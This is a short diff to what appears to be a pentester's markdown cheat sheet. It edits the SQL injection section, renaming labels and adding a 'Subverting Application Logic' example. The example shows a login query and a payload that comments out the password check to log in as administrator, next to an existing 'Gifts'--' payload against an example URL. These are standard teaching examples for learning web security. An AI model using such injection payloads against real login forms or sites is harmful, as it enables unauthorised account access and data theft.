@@ -63,6 +63,13 @@ isubs.sh file.txt
 ## [](#header-2) Sqli
 SQL injection cheat sheet: `https://portswigger.net/web-security/sql-injection/cheat-sheet`
 
-Basic Sql query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+Basic Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
 
-Basic Sqli Payload: `https://insecure-website.com/products?category=Gifts'--`
+Basic Payload: `https://insecure-website.com/products?category=Gifts'--`
+
+Subverting Application Logic
+
+Query: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
+
+Payload: `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
+
